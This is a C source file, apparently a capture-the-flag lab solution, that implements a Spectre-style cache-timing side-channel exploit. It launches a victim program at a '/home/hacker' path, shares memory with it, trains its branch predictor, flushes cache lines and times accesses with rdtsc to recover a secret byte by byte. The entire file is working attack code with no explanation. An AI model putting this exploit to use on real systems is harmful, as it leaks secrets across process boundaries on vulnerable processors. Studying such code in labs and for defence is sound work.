#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <setjmp.h>
#include <x86intrin.h>
#include <sys/mman.h>
#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include <sched.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>


#define CACHE_HIT_THRESHOLD 200
#define CACHE_LINE_SIZE 0x1000
#define BUFF_SIZE 255

#ifdef __APPLE__
#define MAP_POPULATE 0
#endif

char *shared_buffer;
void pre_work()
{
    uint8_t *addr;
    for(int j = 0; j < BUFF_SIZE; j++){
        addr = shared_buffer + j * CACHE_LINE_SIZE;
        _mm_clflush(addr);
    }
}

void train_target()
{
    for (int i = 0;i < 1000; i++)
    {
        int mix_i =((i * 167) + 13) & 255;
        ((volatile int *)shared_buffer)[1] = mix_i % 128;
        ((volatile int *)shared_buffer)[0] = 1;
        sched_yield();
    }

    for (int i = 0; i < 400; i++)
    {
        ((volatile int *)shared_buffer)[1] = 0;
        ((volatile int *)shared_buffer)[0] = 0;
        sched_yield();
    }
}
void speculate(int pos)
{
    for (int i = 0; i < 300; i++)
    {
        ((volatile int *)shared_buffer)[1] = 128 + pos;
        ((volatile int *)shared_buffer)[0] = 1;
        sched_yield();
    }
}

uint64_t time_access_no_flush(void *p)
{
    uint64_t start, end;
    _mm_mfence();
    start = _rdtsc();
    volatile uint64_t x = *(volatile uint64_t*)p;
    _mm_mfence();
    end = _rdtsc();
    return end - start;
}

bool post_work_inner_work(int mix_i)
{
    uint8_t *addr;
    size_t cache_hit_threshold = CACHE_HIT_THRESHOLD;
    int offset;
    uint64_t t_no_flush;
    offset = mix_i * CACHE_LINE_SIZE;
    addr = shared_buffer + offset;
    t_no_flush = time_access_no_flush(addr);
    if (mix_i != 0 && mix_i != 255 && t_no_flush <= cache_hit_threshold)
    {
        printf("cache hit %d timing:%ld\n", mix_i, t_no_flush);
        return true;
    }
    return false;
}

uint64_t post_work_inner_work_min(int mix_i)
{
    uint8_t *addr;
    size_t cache_hit_threshold = CACHE_HIT_THRESHOLD;
    int offset;
    uint64_t t_no_flush;
    offset = mix_i * CACHE_LINE_SIZE;
    addr = shared_buffer + offset;
    return time_access_no_flush(addr);
}

int post_work(int *stats){
    for (size_t i = 0x20; i < 255; i++)
    {
        int mix_i = ((i * 167) + 13) & 255;
        if (post_work_inner_work(mix_i)) {
            stats[mix_i]++;
        }
    }
}

bool unsolved(int *results, int length)
{
    for (int i = 0; i < length; i++)
    {
        if (results[i] == 0)
            return true;
    }
    return false;
}

void exploit(int len)
{
    int *results = malloc(sizeof(int) * len + 1);
    int max_index = 0;
    int max_val = 0;
    int stats[256] = {0};
    while(unsolved(results, len))
    {
        for (int i =0; i < len; i++)
        {
            if (results[i] != '\x00')
                continue;
            for (int j = 0; j < 255; j++)
                stats[j] = 0;
            if (!unsolved(results, len)){
                break;
            }

            for (int j = 0; j < 4000; j++){
                pre_work();
                train_target();
                pre_work();

                speculate(i);
                post_work(stats);
            }
            max_val = 0;
            max_index = 0;
            for(int j = 0x20; j < 120; j++){
                if(stats[j] > max_val)
                {
                    max_index = j;
                    max_val = stats[j];
                }
            }
            if (max_index != 0&& max_val > 4){
                results[i] = max_index;
                printf("attempted index %i found %d = %c with %d hits\n", i, max_index, max_index, stats[max_index]);
            }
            printf("Current results\n");
            for (int j = 0; j < len; j++)
            {
                printf("index: %d value: %c\n", j, results[j]);
            }
        }
    }
}

void * attach_to_shared_mem()
{
    int ret;
    int fd = shm_open("/shm_f", O_RDWR | O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO);
    ret = ftruncate(fd, 0x1000 * 256);
    char *ptr = (char *)mmap(0, 255 * 0x1000, PROT_WRITE | PROT_READ, MAP_SHARED, fd, 0);
    close(fd);
    return ptr;
}

pid_t start_target()
{
    char *new_argv[] = {"/home/hacker/sp-vic", NULL};
    pid_t pid = fork();
    if (!pid){
        execv(new_argv[0], new_argv);
        exit(0);
    }
    return pid;
}

void set_affinity()
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(2, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

int main(int argc, char**argv)
{
    pid_t pid;
    set_affinity();
    shared_buffer = (char *)attach_to_shared_mem();
    ((int *) shared_buffer)[0] = 0;
    ((int *) shared_buffer)[1] = 0;
    ((int *) shared_buffer)[2] = 0;
    pid = start_target();
    sched_yield();
    exploit(5);
    kill(pid, 5);
    return 0;
}